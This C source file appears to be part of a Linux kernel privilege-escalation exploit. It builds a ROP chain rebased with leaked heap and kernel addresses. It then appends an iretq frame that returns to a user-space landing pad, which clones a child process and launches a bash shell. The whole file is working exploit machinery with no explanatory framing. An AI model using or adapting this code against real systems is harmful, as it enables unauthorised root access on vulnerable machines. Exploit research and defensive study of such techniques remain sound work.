#define _GNU_SOURCE
#include <signal.h>
#include <sched.h>
#include <stdint.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/wait.h>

#include "../config.h"

#ifdef ROP_DEBUG
#define DEBUG
#endif // ROP_DEBUG

#include "rop.h"
#include "utils.h"
#include "errhandling.h"
#include "leaks.h"

// address of first byte in ROP chain
uint64_t rop_chain_base;

const uint32_t min_rop_chain_len = MIN_ROP_CHAIN_LEN;
const uint32_t max_rop_chain_len = MAX_ROP_CHAIN_LEN;

uint64_t* rop_chain_buf;

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wlanguage-extension-token"
#pragma clang diagnostic ignored "-Wunused-function"
static inline uint64_t rd_cs(void)
{
  uint64_t x;

  asm volatile (
      "movq %%cs, %0;\n\t"
      : "=r" (x)
      :
      :);

  return x;
}

static inline uint64_t rd_ss(void)
{
  uint64_t x;

  asm volatile (
      "movq %%ss, %0;\n\t"
      : "=r" (x)
      :
      :);

  return x;
}

static inline uint64_t rd_flags(void)
{
  uint64_t x;

  asm volatile (
      "pushfq;\n\t"
      "popq %0;\n\t"
      : "=r" (x)
      :
      : "memory");

  return x;
}

static inline void r_maccess(void *p) {
  asm volatile ("movl (%0), %%eax;\n" : : "r"(p) : "eax");
}

static inline void w_maccess(void *p) {
  asm volatile ("movl $0x0, (%0);\n" : : "r"(p) : "memory");
}
#pragma clang diagnostic pop

static int _Noreturn child_func(void* arg)
{
  char* argv[] = { NULL };

  execvp("bash", arg ? (char**) arg : argv);

  err(EXIT_FAILURE, "execvp");
}

static void _Noreturn rop_landing_pad(void)
{
  pid_t child_pid;
  void* child_stack;

  LOGS("The eagle has landed");

  CHECK_SYS(child_stack = (void*)((char*)mmap(NULL, ROP_STACK_SZ,
	PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
        + ROP_STACK_SZ), "mmap");

  CHECK_SYS(child_pid = clone(child_func, child_stack, SIGCHLD, NULL),
      "clone");

  LOGI("Launched shell (%d)", child_pid);

  wait(NULL);

  exit(EXIT_FAILURE);
}

static void rop_chain_append_iretq_regs(struct iretq_regs* buf)
{
  buf->ip = (uint64_t)&rop_landing_pad;
  buf->cs = rd_cs();
  buf->flags = rd_flags();
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wbad-function-cast"
  CHECK_SYS(buf->sp = (uint64_t)mmap(NULL,
	ROP_STACK_SZ, PROT_READ | PROT_WRITE,
	MAP_ANONYMOUS | MAP_PRIVATE, -1, 0) + ROP_STACK_SZ, "mmap");
#pragma clang diagnostic pop
  w_maccess((void*)(buf->sp - 0x800)); // fault in first page
  buf->ss = rd_ss();

  LOGD("buf->ip = %lx", buf->ip);
  LOGD("buf->cs = %lx", buf->cs);
  LOGD("buf->flags = %lx", buf->flags);
  LOGD("buf->sp = %lx", buf->sp);
  LOGD("buf->ss = %lx", buf->ss);
}

/* optionally appends an iretq stack frame to the rop_chain
 * - if true, rop_chain_len is the length _including_ the iretq stack
 */
int rop_gen_chain(bool append_iretq_regs)
{
  int ret = 0;
  unsigned int i = 0;
  uint32_t reduced_rop_chain_len = append_iretq_regs ?
    			rop_chain_len - sizeof(struct iretq_regs)
			: rop_chain_len;

  CHECK_NOT_ZERO(rop_chain_base, "Cannot generate ROP chain without a "
      "heap leak");
  CHECK_NOT_ZERO(kernel_base, "Cannot generate ROP chain without a "
      "kernel leak");

  if (unlikely(rop_chain_len > max_rop_chain_len)) {
    err(1, "ROP chain is too long");
  }

  CHECK_PTR(rop_chain_buf = calloc(1, max_rop_chain_len), "calloc");

  for (i = 0;
       i < reduced_rop_chain_len / sizeof(uint64_t);
       i++)
  {
    uint64_t value = rop_chain[i];
    if (value & ROP_NEED_RB_H) {
      rop_chain_buf[i] = ROP_RB_H(value);
    } else if (value & ROP_NEED_RB_K) {
      rop_chain_buf[i] = ROP_RB_K(value);
    } else {
      rop_chain_buf[i] = value;
    }
    LOGD("rop_chain_buf[%u] = %lx", i, rop_chain_buf[i]);
  }

  if (append_iretq_regs) {
    rop_chain_append_iretq_regs(
	(struct iretq_regs*)&rop_chain_buf[i]);
  }

  LOGI("Generated ROP chain of length %u", rop_chain_len);

  return ret;
}
